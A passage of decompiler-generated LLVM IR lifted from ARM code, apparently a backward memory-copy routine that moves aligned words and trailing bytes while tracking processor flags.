  store i32 %v2_13fb0, i32* %r2.global-to-local, align 4
  %v6_13fb4 = icmp slt i32 %v0_13fb0, 32
  br i1 %v6_13fb4, label %dec_label_pc_13fb8.loopexit, label %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge

dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge:  ; preds = %dec_label_pc_13fa0
  %v0_13fa0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13fa0

dec_label_pc_13fb8.loopexit:                      ; preds = %dec_label_pc_13fa0
  %v4_13fb0 = sub i32 31, %v0_13fb0
  %v5_13fb0 = and i32 %v4_13fb0, %v0_13fb0
  %v6_13fb0 = icmp slt i32 %v5_13fb0, 0
  %v7_13fb0 = icmp slt i32 %v2_13fb0, 0
  store i1 %v6_13fb0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13fb0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13fb8

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fb8.loopexit, %dec_label_pc_13f94
  %v6_13fc0 = phi i32 [ %v1_13fac, %dec_label_pc_13fb8.loopexit ], [ %v0_13fa448, %dec_label_pc_13f94 ]
  %v0_13fc8.pr = phi i32 [ %v2_13fb0, %dec_label_pc_13fb8.loopexit ], [ %v2_13f98, %dec_label_pc_13f94 ]
  %v4_13fb8 = add i32 %v0_13fc8.pr, 16
  %v6_13fb8 = sub i32 0, %v0_13fc8.pr
  %v7_13fb8 = and i32 %v4_13fb8, %v6_13fb8
  %v8_13fb8 = icmp slt i32 %v7_13fb8, 0
  store i1 %v8_13fb8, i1* %cpsr_v.global-to-local, align 1
  %v9_13fb8 = icmp slt i32 %v4_13fb8, 0
  store i1 %v9_13fb8, i1* %cpsr_n.global-to-local, align 1
  %v10_13fb8 = icmp eq i32 %v4_13fb8, 0
  store i1 %v10_13fb8, i1* %cpsr_z.global-to-local, align 1
  %v5_13fbc = icmp slt i32 %v0_13fc8.pr, -16
  br i1 %v5_13fbc, label %.thread13, label %bb138

bb138:                                            ; preds = %dec_label_pc_13fb8
  %v6_13fbc = load i32, i32* %r1.global-to-local, align 4
  %v7_13fbc = add i32 %v6_13fbc, -4
  %v8_13fbc = inttoptr i32 %v7_13fbc to i32*
  %v9_13fbc = load i32, i32* %v8_13fbc, align 4
  store i32 %v9_13fbc, i32* %r3.global-to-local, align 4
  %v10_13fbc = add i32 %v6_13fbc, -8
  %v11_13fbc = inttoptr i32 %v10_13fbc to i32*
  %v12_13fbc = load i32, i32* %v11_13fbc, align 4
  store i32 %v12_13fbc, i32* %r4.global-to-local, align 4
  %v13_13fbc = add i32 %v6_13fbc, -12
  %v14_13fbc = inttoptr i32 %v13_13fbc to i32*
  %v15_13fbc = load i32, i32* %v14_13fbc, align 4
  store i32 %v15_13fbc, i32* @ip, align 4
  %v16_13fbc = add i32 %v6_13fbc, -16
  %v17_13fbc = inttoptr i32 %v16_13fbc to i32*
  %v18_13fbc = load i32, i32* %v17_13fbc, align 4
  store i32 %v18_13fbc, i32* %lr.global-to-local, align 4
  store i32 %v16_13fbc, i32* %r1.global-to-local, align 4
  %v7_13fc0 = add i32 %v6_13fc0, -16
  %v8_13fc0 = inttoptr i32 %v7_13fc0 to i32*
  store i32 %v9_13fbc, i32* %v8_13fc0, align 4
  %v10_13fc0 = add i32 %v6_13fc0, -12
  %v11_13fc0 = inttoptr i32 %v10_13fc0 to i32*
  %v12_13fc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_13fc0, i32* %v11_13fc0, align 4
  %v13_13fc0 = add i32 %v6_13fc0, -8
  %v14_13fc0 = inttoptr i32 %v13_13fc0 to i32*
  %v15_13fc0 = load i32, i32* @ip, align 4
  store i32 %v15_13fc0, i32* %v14_13fc0, align 4
  %v16_13fc0 = add i32 %v6_13fc0, -4
  %v17_13fc0 = inttoptr i32 %v16_13fc0 to i32*
  %v18_13fc0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_13fc0, i32* %v17_13fc0, align 4
  store i32 %v7_13fc0, i32* %r0.global-to-local, align 4
  %v6_13fc4 = load i32, i32* %r2.global-to-local, align 4
  %v7_13fc4 = add i32 %v6_13fc4, -16
  store i32 %v7_13fc4, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_13fb8, %bb138
  %v6_13fd0 = phi i32 [ %v7_13fc0, %bb138 ], [ %v6_13fc0, %dec_label_pc_13fb8 ]
  %v0_13fc8 = phi i32 [ %v7_13fc4, %bb138 ], [ %v0_13fc8.pr, %dec_label_pc_13fb8 ]
  %v4_13fc8 = add i32 %v0_13fc8, 20
  store i32 %v4_13fc8, i32* %r2.global-to-local, align 4
  %v6_13fc8 = sub i32 0, %v0_13fc8
  %v7_13fc8 = and i32 %v4_13fc8, %v6_13fc8
  %v8_13fc8 = icmp slt i32 %v7_13fc8, 0
  store i1 %v8_13fc8, i1* %cpsr_v.global-to-local, align 1
  %v9_13fc8 = icmp slt i32 %v4_13fc8, 0
  store i1 %v9_13fc8, i1* %cpsr_n.global-to-local, align 1
  %v10_13fc8 = icmp eq i32 %v4_13fc8, 0
  store i1 %v10_13fc8, i1* %cpsr_z.global-to-local, align 1
  %v5_13fcc = icmp slt i32 %v0_13fc8, -20
  br i1 %v5_13fcc, label %.thread15, label %bb139

bb139:                                            ; preds = %.thread13
  %v6_13fcc = load i32, i32* %r1.global-to-local, align 4
  %v7_13fcc = add i32 %v6_13fcc, -4
  %v8_13fcc = inttoptr i32 %v7_13fcc to i32*
  %v9_13fcc = load i32, i32* %v8_13fcc, align 4
  store i32 %v9_13fcc, i32* %r3.global-to-local, align 4
  %v10_13fcc = add i32 %v6_13fcc, -8
  %v11_13fcc = inttoptr i32 %v10_13fcc to i32*
  %v12_13fcc = load i32, i32* %v11_13fcc, align 4
  store i32 %v12_13fcc, i32* @ip, align 4
  %v13_13fcc = add i32 %v6_13fcc, -12
  %v14_13fcc = inttoptr i32 %v13_13fcc to i32*
  %v15_13fcc = load i32, i32* %v14_13fcc, align 4
  store i32 %v15_13fcc, i32* %lr.global-to-local, align 4
  store i32 %v13_13fcc, i32* %r1.global-to-local, align 4
  %v7_13fd0 = add i32 %v6_13fd0, -12
  %v8_13fd0 = inttoptr i32 %v7_13fd0 to i32*
  store i32 %v9_13fcc, i32* %v8_13fd0, align 4
  %v10_13fd0 = add i32 %v6_13fd0, -8
  %v11_13fd0 = inttoptr i32 %v10_13fd0 to i32*
  %v12_13fd0 = load i32, i32* @ip, align 4
  store i32 %v12_13fd0, i32* %v11_13fd0, align 4
  %v13_13fd0 = add i32 %v6_13fd0, -4
  %v14_13fd0 = inttoptr i32 %v13_13fd0 to i32*
  %v15_13fd0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_13fd0, i32* %v14_13fd0, align 4
  store i32 %v7_13fd0, i32* %r0.global-to-local, align 4
  %v6_13fd4 = load i32, i32* %r2.global-to-local, align 4
  %v7_13fd4 = add i32 %v6_13fd4, -12
  store i32 %v7_13fd4, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb139
  %v6_13ff456 = phi i32 [ %v6_13fd0, %.thread13 ], [ %v7_13fd0, %bb139 ]
  %v0_13fdc54 = phi i32 [ %v4_13fc8, %.thread13 ], [ %v7_13fd4, %bb139 ]
  %v2_13fd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13fd8, i32* @r4, align 4
  store i32 %v6_13f94, i32* @lr, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13f8c, %.thread15
  %v7_13fec = phi i32 [ %v0_13fa448, %dec_label_pc_13f8c ], [ %v6_13ff456, %.thread15 ]
  %v0_13fdc = phi i32 [ %v2_13f8c, %dec_label_pc_13f8c ], [ %v0_13fdc54, %.thread15 ]
  %v2_13fdc = add i32 %v0_13fdc, 8
  store i32 %v2_13fdc, i32* %r2.global-to-local, align 4
  %v4_13fdc = sub i32 0, %v0_13fdc
  %v5_13fdc = and i32 %v2_13fdc, %v4_13fdc
  %v6_13fdc = icmp slt i32 %v5_13fdc, 0
  store i1 %v6_13fdc, i1* %cpsr_v.global-to-local, align 1
  %v7_13fdc = icmp slt i32 %v2_13fdc, 0
  store i1 %v7_13fdc, i1* %cpsr_n.global-to-local, align 1
  %v8_13fdc = icmp eq i32 %v2_13fdc, 0
  store i1 %v8_13fdc, i1* %cpsr_z.global-to-local, align 1
  %v5_13fe0 = icmp slt i32 %v0_13fdc, -8
  br i1 %v5_13fe0, label %bb141, label %dec_label_pc_13fe4

dec_label_pc_13fe4:                               ; preds = %dec_label_pc_13fdc
  %v6_13fe4 = add i32 %v0_13fdc, 4
  store i32 %v6_13fe4, i32* %r2.global-to-local, align 4
  %v8_13fe4 = sub i32 -5, %v0_13fdc
  %v9_13fe4 = and i32 %v8_13fe4, %v2_13fdc
  %v10_13fe4 = icmp slt i32 %v9_13fe4, 0
  store i1 %v10_13fe4, i1* %cpsr_v.global-to-local, align 1
  %v11_13fe4 = icmp slt i32 %v6_13fe4, 0
  store i1 %v11_13fe4, i1* %cpsr_n.global-to-local, align 1
  %v12_13fe4 = icmp eq i32 %v2_13fdc, 4
  store i1 %v12_13fe4, i1* %cpsr_z.global-to-local, align 1
  %v5_13fe8 = icmp slt i32 %v2_13fdc, 4
  %v6_13fe8 = load i32, i32* %r1.global-to-local, align 4
  %v7_13fe8 = add i32 %v6_13fe8, -4
  %v8_13fe8 = inttoptr i32 %v7_13fe8 to i32*
  %v9_13fe8 = load i32, i32* %v8_13fe8, align 4
  store i32 %v9_13fe8, i32* %r3.global-to-local, align 4
  br i1 %v5_13fe8, label %.thread19, label %bb140

.thread19:                                        ; preds = %dec_label_pc_13fe4
  store i32 %v7_13fe8, i32* %r1.global-to-local, align 4
  %v8_13fec = add i32 %v7_13fec, -4
  %v9_13fec = inttoptr i32 %v8_13fec to i32*
  store i32 %v9_13fe8, i32* %v9_13fec, align 4
  %v10_13fec = load i32, i32* %r0.global-to-local, align 4
  %v11_13fec = add i32 %v10_13fec, -4
  store i32 %v11_13fec, i32* %r0.global-to-local, align 4
  %v0_13ffc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_13fe4
  %v10_13ff0 = add i32 %v6_13fe8, -8
  %v11_13ff0 = inttoptr i32 %v10_13ff0 to i32*
  %v12_13ff0 = load i32, i32* %v11_13ff0, align 4
  store i32 %v12_13ff0, i32* @ip, align 4
  store i32 %v10_13ff0, i32* %r1.global-to-local, align 4
  %v7_13ff4 = add i32 %v7_13fec, -8
  %v8_13ff4 = inttoptr i32 %v7_13ff4 to i32*
  store i32 %v9_13fe8, i32* %v8_13ff4, align 4
  %v10_13ff4 = add i32 %v7_13fec, -4
  %v11_13ff4 = inttoptr i32 %v10_13ff4 to i32*
  %v12_13ff4 = load i32, i32* @ip, align 4
  store i32 %v12_13ff4, i32* %v11_13ff4, align 4
  store i32 %v7_13ff4, i32* %r0.global-to-local, align 4
  %v6_13ff8 = load i32, i32* %r2.global-to-local, align 4
  %v7_13ff8 = add i32 %v6_13ff8, -4
  store i32 %v7_13ff8, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_13fdc, %dec_label_pc_13f6c, %dec_label_pc_141a0, %dec_label_pc_14134, %dec_label_pc_140c8, %bb140
  %v2_14000 = phi i32 [ %v11_13fec, %.thread19 ], [ %v0_1409831, %.thread25 ], [ %v7_13fec, %dec_label_pc_13fdc ], [ %v2_13f70, %dec_label_pc_13f6c ], [ %v2_1400c64, %dec_label_pc_141a0 ], [ %v2_1400c63, %dec_label_pc_14134 ], [ %v2_1400c62, %dec_label_pc_140c8 ], [ %v7_13ff4, %bb140 ]
  %v0_13ffc = phi i32 [ %v0_13ffc.pre, %.thread19 ], [ %v2_14040, %.thread25 ], [ %v2_13fdc, %dec_label_pc_13fdc ], [ %v2_13f74, %dec_label_pc_13f6c ], [ %v0_13ffc60, %dec_label_pc_141a0 ], [ %v0_13ffc59, %dec_label_pc_14134 ], [ %v0_13ffc58, %dec_label_pc_140c8 ], [ %v7_13ff8, %bb140 ]
  %v1_13ffc = add i32 %v0_13ffc, 4
  store i32 %v1_13ffc, i32* %r2.global-to-local, align 4
  %v3_13ffc = sub i32 0, %v0_13ffc
  %v4_13ffc = and i32 %v1_13ffc, %v3_13ffc
  %v5_13ffc = icmp slt i32 %v4_13ffc, 0
  store i1 %v5_13ffc, i1* %cpsr_v.global-to-local, align 1
  %v6_13ffc = icmp slt i32 %v1_13ffc, 0
  store i1 %v6_13ffc, i1* %cpsr_n.global-to-local, align 1
  %v7_13ffc = icmp eq i32 %v1_13ffc, 0
  store i1 %v7_13ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13ffc, label %.thread122, label %bb142

bb142:                                            ; preds = %bb141
  %v1_14004 = add i32 %v0_13ffc, 2
  %v3_14004 = sub i32 -3, %v0_13ffc
  %v4_14004 = and i32 %v3_14004, %v1_13ffc
  %v5_14004 = icmp slt i32 %v4_14004, 0
  store i1 %v5_14004, i1* %cpsr_v.global-to-local, align 1
  %v6_14004 = icmp slt i32 %v1_14004, 0
  store i1 %v6_14004, i1* %cpsr_n.global-to-local, align 1
  %v7_14004 = icmp eq i32 %v1_13ffc, 2
  store i1 %v7_14004, i1* %cpsr_z.global-to-local, align 1
  %v0_14008 = load i32, i32* %r1.global-to-local, align 4
  %v1_14008 = add i32 %v0_14008, -1
  %v2_14008 = inttoptr i32 %v1_14008 to i8*
  %v3_14008 = load i8, i8* %v2_14008, align 1
  %v4_14008 = zext i8 %v3_14008 to i32
  store i32 %v4_14008, i32* %r3.global-to-local, align 4
  store i32 %v1_14008, i32* %r1.global-to-local, align 4
  %v3_1400c = add i32 %v2_14000, -1
  %v4_1400c = inttoptr i32 %v3_1400c to i8*
  store i8 %v3_14008, i8* %v4_1400c, align 1
  %v5_1400c = load i32, i32* %r0.global-to-local, align 4
  %v6_1400c = add i32 %v5_1400c, -1
  store i32 %v6_1400c, i32* %r0.global-to-local, align 4
  %v0_14010 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14010 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14010 = xor i1 %v0_14010, %v1_14010
  br i1 %v2_14010, label %.thread121, label %bb143

bb143:                                            ; preds = %bb142
  %v3_14010 = load i32, i32* %r1.global-to-local, align 4
  %v4_14010 = add i32 %v3_14010, -1
  %v5_14010 = inttoptr i32 %v4_14010 to i8*
  %v6_14010 = load i8, i8* %v5_14010, align 1
  %v7_14010 = zext i8 %v6_14010 to i32
  store i32 %v7_14010, i32* %r3.global-to-local, align 4
  store i32 %v4_14010, i32* %r1.global-to-local, align 4
  %v6_14014 = add i32 %v5_1400c, -2
  %v7_14014 = inttoptr i32 %v6_14014 to i8*
  store i8 %v6_14010, i8* %v7_14014, align 1
  %v8_14014 = load i32, i32* %r0.global-to-local, align 4
  %v9_14014 = add i32 %v8_14014, -1
  store i32 %v9_14014, i32* %r0.global-to-local, align 4
  %v1_14018.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14018.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb142, %bb143
  %v7_1401c = phi i32 [ %v9_14014, %bb143 ], [ %v6_1400c, %bb142 ]
  %v2_1401c = phi i1 [ %v2_14018.pre, %bb143 ], [ %v1_14010, %bb142 ]
  %v1_1401c = phi i1 [ %v1_14018.pre, %bb143 ], [ %v0_14010, %bb142 ]
  %v0_14018 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_14018 = xor i1 %v2_1401c, %v1_1401c
  %v4_14018 = or i1 %v0_14018, %v3_14018
  br i1 %v4_14018, label %.thread122, label %bb144

bb144:                                            ; preds = %.thread121
  %v5_14018 = load i32, i32* %r1.global-to-local, align 4
  %v6_14018 = add i32 %v5_14018, -1
  %v7_14018 = inttoptr i32 %v6_14018 to i8*
  %v8_14018 = load i8, i8* %v7_14018, align 1
  %v9_14018 = zext i8 %v8_14018 to i32
  store i32 %v9_14018, i32* %r3.global-to-local, align 4
  store i32 %v6_14018, i32* %r1.global-to-local, align 4
  %v8_1401c = add i32 %v7_1401c, -1
  %v9_1401c = inttoptr i32 %v8_1401c to i8*
  store i8 %v8_14018, i8* %v9_1401c, align 1
  %v10_1401c = load i32, i32* %r0.global-to-local, align 4
  %v11_1401c = add i32 %v10_1401c, -1
  store i32 %v11_1401c, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_14024:                               ; preds = %dec_label_pc_13f7c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14024 = icmp eq i32 %v1_13f7c, 1
  store i1 %v8_14024, i1* %cpsr_n.global-to-local, align 1
  %v9_14024 = icmp eq i32 %v1_13f7c, 2
  store i1 %v9_14024, i1* %cpsr_z.global-to-local, align 1
  %v1_14028 = add i32 %v2_13f6c, -1
  %v2_14028 = inttoptr i32 %v1_14028 to i8*
  %v3_14028 = load i8, i8* %v2_14028, align 1
  %v4_14028 = zext i8 %v3_14028 to i32
  store i32 %v4_14028, i32* %r3.global-to-local, align 4
  store i32 %v1_14028, i32* %r1.global-to-local, align 4
  %v3_1402c = add i32 %v2_13f70, -1
  %v4_1402c = inttoptr i32 %v3_1402c to i8*
  store i8 %v3_14028, i8* %v4_1402c, align 1
  %v5_1402c = load i32, i32* %r0.global-to-local, align 4
  %v6_1402c = add i32 %v5_1402c, -1
  store i32 %v6_1402c, i32* %r0.global-to-local, align 4
  br i1 %v8_14024, label %.thread25, label %bb145

bb145:                                            ; preds = %dec_label_pc_14024
  %v6_14030 = load i32, i32* %r1.global-to-local, align 4
  %v7_14030 = add i32 %v6_14030, -1
  %v8_14030 = inttoptr i32 %v7_14030 to i8*
  %v9_14030 = load i8, i8* %v8_14030, align 1
  %v10_14030 = zext i8 %v9_14030 to i32
  store i32 %v10_14030, i32* %r3.global-to-local, align 4
  store i32 %v7_14030, i32* %r1.global-to-local, align 4
  %v9_14034 = add i32 %v5_1402c, -2
  %v10_14034 = inttoptr i32 %v9_14034 to i8*
  store i8 %v9_14030, i8* %v10_14034, align 1
  %v11_14034 = load i32, i32* %r0.global-to-local, align 4
  %v12_14034 = add i32 %v11_14034, -1
  store i32 %v12_14034, i32* %r0.global-to-local, align 4
  br i1 %v9_14024, label %.thread25, label %bb146

bb146:                                            ; preds = %bb145
  %v8_14038 = load i32, i32* %r1.global-to-local, align 4
  %v9_14038 = add i32 %v8_14038, -1
  %v10_14038 = inttoptr i32 %v9_14038 to i8*
  %v11_14038 = load i8, i8* %v10_14038, align 1
  %v12_14038 = zext i8 %v11_14038 to i32
  store i32 %v12_14038, i32* %r3.global-to-local, align 4
  store i32 %v9_14038, i32* %r1.global-to-local, align 4
  %v11_1403c = add i32 %v11_14034, -2
  %v12_1403c = inttoptr i32 %v11_1403c to i8*
  store i8 %v11_14038, i8* %v12_1403c, align 1
  %v13_1403c = load i32, i32* %r0.global-to-local, align 4
  %v14_1403c = add i32 %v13_1403c, -1
  store i32 %v14_1403c, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb145, %dec_label_pc_14024, %bb146
  %v0_1409831 = phi i32 [ %v12_14034, %bb145 ], [ %v6_1402c, %dec_label_pc_14024 ], [ %v14_1403c, %bb146 ]
  %v0_14040 = load i32, i32* %r2.global-to-local, align 4
  %v1_14040 = load i32, i32* @ip, align 4
  %v2_14040 = sub i32 %v0_14040, %v1_14040
  store i32 %v2_14040, i32* %r2.global-to-local, align 4
  %v4_14040 = xor i32 %v1_14040, %v0_14040
  %v5_14040 = xor i32 %v2_14040, %v0_14040
  %v6_14040 = and i32 %v5_14040, %v4_14040
  %v7_14040 = icmp slt i32 %v6_14040, 0
  store i1 %v7_14040, i1* %cpsr_v.global-to-local, align 1
  %v8_14040 = icmp slt i32 %v2_14040, 0
  store i1 %v8_14040, i1* %cpsr_n.global-to-local, align 1
  %v9_14040 = icmp eq i32 %v0_14040, %v1_14040
  store i1 %v9_14040, i1* %cpsr_z.global-to-local, align 1
  %v5_14044 = icmp slt i32 %v0_14040, %v1_14040
  br i1 %v5_14044, label %bb141, label %dec_label_pc_14048

dec_label_pc_14048:                               ; preds = %.thread25
  %v0_14048 = load i32, i32* %r1.global-to-local, align 4
  %v1_14048 = urem i32 %v0_14048, 4
  store i32 %v1_14048, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14048 = icmp eq i32 %v1_14048, 0
  store i1 %v2_14048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14048, label %dec_label_pc_13f8c, label %dec_label_pc_14050

dec_label_pc_14050:                               ; preds = %dec_label_pc_13f84, %dec_label_pc_14048
  %v0_1409830 = phi i32 [ %v2_13f70, %dec_label_pc_13f84 ], [ %v0_1409831, %dec_label_pc_14048 ]
  %v0_14144 = phi i32 [ %v2_13f74, %dec_label_pc_13f84 ], [ %v2_14040, %dec_label_pc_14048 ]
  %v0_14050 = phi i32 [ %v2_13f6c, %dec_label_pc_13f84 ], [ %v0_14048, %dec_label_pc_14048 ]
  %v0_14058 = phi i32 [ %v1_13f84, %dec_label_pc_13f84 ], [ %v1_14048, %dec_label_pc_14048 ]
  %v1_14050 = and i32 %v0_14050, -4
  store i32 %v1_14050, i32* %r1.global-to-local, align 4
  %v1_14054 = inttoptr i32 %v1_14050 to i32*
  %v2_14054 = load i32, i32* %v1_14054, align 4
  store i32 %v2_14054, i32* %r3.global-to-local, align 4
  %v7_14058 = icmp ult i32 %v0_14058, 2
  %v2_1413c = add i32 %v0_14144, -12
  %v4_1413c = sub i32 11, %v0_14144
  %v5_1413c = and i32 %v4_1413c, %v0_14144
  %v6_1413c = icmp slt i32 %v5_1413c, 0
  store i1 %v6_1413c, i1* %cpsr_v.global-to-local, align 1
  %v7_1413c = icmp slt i32 %v2_1413c, 0
  store i1 %v7_1413c, i1* %cpsr_n.global-to-local, align 1
  %v8_1413c = icmp eq i32 %v0_14144, 12
  store i1 %v8_1413c, i1* %cpsr_z.global-to-local, align 1
  %v5_14140 = icmp slt i32 %v0_14144, 12
  br i1 %v7_14058, label %dec_label_pc_1413c, label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %dec_label_pc_14050
  %v8_14058 = icmp eq i32 %v0_14058, 2
  br i1 %v8_14058, label %dec_label_pc_140d0, label %dec_label_pc_14064

dec_label_pc_14064:                               ; preds = %dec_label_pc_14060
  br i1 %v5_14140, label %dec_label_pc_140b0, label %dec_label_pc_1406c

dec_label_pc_1406c:                               ; preds = %dec_label_pc_14064
  store i32 %v2_1413c, i32* %r2.global-to-local, align 4
  %v3_14070 = load i32, i32* @r4, align 4
  store i32 %v3_14070, i32* %stack_var_-12, align 4
  %v6_14070 = load i32, i32* @r5, align 4
  store i32 %v6_14070, i32* %stack_var_-8, align 4
  %v9_14070 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14074

dec_label_pc_14074:                               ; preds = %dec_label_pc_14074.dec_label_pc_14074_crit_edge, %dec_label_pc_1406c
  %v0_14098 = phi i32 [ %v1_14098, %dec_label_pc_14074.dec_label_pc_14074_crit_edge ], [ %v0_1409830, %dec_label_pc_1406c ]
  %v0_14078 = phi i32 [ %v0_14078.pre, %dec_label_pc_14074.dec_label_pc_14074_crit_edge ], [ %v1_14050, %dec_label_pc_1406c ]
  %v0_14074 = phi i32 [ %v0_14074.pre, %dec_label_pc_14074.dec_label_pc_14074_crit_edge ], [ %v2_14054, %dec_label_pc_1406c ]
  %v3_14074 = mul i32 %v0_14074, 256
  store i32 %v3_14074, i32* %lr.global-to-local, align 4
  %v1_14078 = add i32 %v0_14078, -4
  %v2_14078 = inttoptr i32 %v1_14078 to i32*
  %v3_14078 = load i32, i32* %v2_14078, align 4
  store i32 %v3_14078, i32* %r3.global-to-local, align 4
  %v4_14078 = add i32 %v0_14078, -8
  %v5_14078 = inttoptr i32 %v4_14078 to i32*
  %v6_14078 = load i32, i32* %v5_14078, align 4
  store i32 %v6_14078, i32* %r4.global-to-local, align 4
  %v7_14078 = add i32 %v0_14078, -12
  %v8_14078 = inttoptr i32 %v7_14078 to i32*
  %v9_14078 = load i32, i32* %v8_14078, align 4
  store i32 %v9_14078, i32* %r5.global-to-local, align 4
  %v10_14078 = add i32 %v0_14078, -16
  %v11_14078 = inttoptr i32 %v10_14078 to i32*
  %v12_14078 = load i32, i32* %v11_14078, align 4
  store i32 %v10_14078, i32* %r1.global-to-local, align 4
  %v4_1407c = udiv i32 %v12_14078, 16777216
  %v5_1407c = or i32 %v4_1407c, %v3_14074
  store i32 %v5_1407c, i32* %lr.global-to-local, align 4
  %v3_14080 = mul i32 %v12_14078, 256
  %v4_14084 = udiv i32 %v9_14078, 16777216
  %v5_14084 = or i32 %v3_14080, %v4_14084
  store i32 %v5_14084, i32* @ip, align 4
  %v3_14088 = mul i32 %v9_14078, 256
  %v4_1408c = udiv i32 %v6_14078, 16777216
  %v5_1408c = or i32 %v3_14088, %v4_1408c
  store i32 %v5_1408c, i32* %r5.global-to-local, align 4
  %v3_14090 = mul i32 %v6_14078, 256
  %v4_14094 = udiv i32 %v3_14078, 16777216
  %v5_14094 = or i32 %v3_14090, %v4_14094
  store i32 %v5_14094, i32* %r4.global-to-local, align 4
  %v1_14098 = add i32 %v0_14098, -16
  %v2_14098 = inttoptr i32 %v1_14098 to i32*
  store i32 %v5_14094, i32* %v2_14098, align 4
  %v4_14098 = add i32 %v0_14098, -12
  %v5_14098 = inttoptr i32 %v4_14098 to i32*
  %v6_14098 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14098, i32* %v5_14098, align 4
  %v7_14098 = add i32 %v0_14098, -8
  %v8_14098 = inttoptr i32 %v7_14098 to i32*
  %v9_14098 = load i32, i32* @ip, align 4
  store i32 %v9_14098, i32* %v8_14098, align 4
  %v10_14098 = add i32 %v0_14098, -4
  %v11_14098 = inttoptr i32 %v10_14098 to i32*
  %v12_14098 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14098, i32* %v11_14098, align 4
  store i32 %v1_14098, i32* %r0.global-to-local, align 4
  %v0_1409c = load i32, i32* %r2.global-to-local, align 4
  %v2_1409c = add i32 %v0_1409c, -16
  store i32 %v2_1409c, i32* %r2.global-to-local, align 4
  %v6_140a0 = icmp slt i32 %v0_1409c, 16
  br i1 %v6_140a0, label %dec_label_pc_140a4, label %dec_label_pc_14074.dec_label_pc_14074_crit_edge

dec_label_pc_14074.dec_label_pc_14074_crit_edge:  ; preds = %dec_label_pc_14074
  %v0_14074.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14078.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14074

dec_label_pc_140a4:                               ; preds = %dec_label_pc_14074
  %v2_140a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_140a4, i32* @r4, align 4
  %v5_140a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_140a4, i32* @r5, align 4
  store i32 %v9_14070, i32* @lr, align 4
  %v2_140a8 = add i32 %v0_1409c, -4
  store i32 %v2_140a8, i32* %r2.global-to-local, align 4
  %v4_140a8 = add i32 %v0_1409c, 2147483632
  %v5_140a8 = and i32 %v2_140a8, %v4_140a8
  %v6_140a8 = icmp slt i32 %v5_140a8, 0
  store i1 %v6_140a8, i1* %cpsr_v.global-to-local, align 1
  %v7_140a8 = icmp slt i32 %v2_140a8, 0
  store i1 %v7_140a8, i1* %cpsr_n.global-to-local, align 1
  %v8_140a8 = icmp eq i32 %v2_140a8, 0
  store i1 %v8_140a8, i1* %cpsr_z.global-to-local, align 1
  %v5_140ac = icmp slt i32 %v2_1409c, -12
  br i1 %v5_140ac, label %dec_label_pc_140c8, label %dec_label_pc_140b0

dec_label_pc_140b0:                               ; preds = %dec_label_pc_140a4, %dec_label_pc_14064, %dec_label_pc_140b0
  %v1_140bc = phi i32 [ %v5_140bc, %dec_label_pc_140b0 ], [ %v1_14098, %dec_label_pc_140a4 ], [ %v0_1409830, %dec_label_pc_14064 ]
  %v0_140b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_140b0 = mul i32 %v0_140b0, 256
  store i32 %v3_140b0, i32* %ip.global-to-local, align 4
  %v0_140b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_140b4 = add i32 %v0_140b4, -4
  %v2_140b4 = inttoptr i32 %v1_140b4 to i32*
  %v3_140b4 = load i32, i32* %v2_140b4, align 4
  store i32 %v3_140b4, i32* %r3.global-to-local, align 4
  store i32 %v1_140b4, i32* %r1.global-to-local, align 4
  %v4_140b8 = udiv i32 %v3_140b4, 16777216
  %v5_140b8 = or i32 %v4_140b8, %v3_140b0
  store i32 %v5_140b8, i32* @ip, align 4
  %v2_140bc = add i32 %v1_140bc, -4
  %v3_140bc = inttoptr i32 %v2_140bc to i32*
  store i32 %v5_140b8, i32* %v3_140bc, align 4
  %v4_140bc = load i32, i32* %r0.global-to-local, align 4
  %v5_140bc = add i32 %v4_140bc, -4
  store i32 %v5_140bc, i32* %r0.global-to-local, align 4
  %v0_140c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_140c0 = add i32 %v0_140c0, -4
  store i32 %v2_140c0, i32* %r2.global-to-local, align 4
  %v6_140c4 = icmp slt i32 %v0_140c0, 4
  br i1 %v6_140c4, label %dec_label_pc_140c8.loopexit, label %dec_label_pc_140b0

dec_label_pc_140c8.loopexit:                      ; preds = %dec_label_pc_140b0
  %v4_140c0 = sub i32 3, %v0_140c0
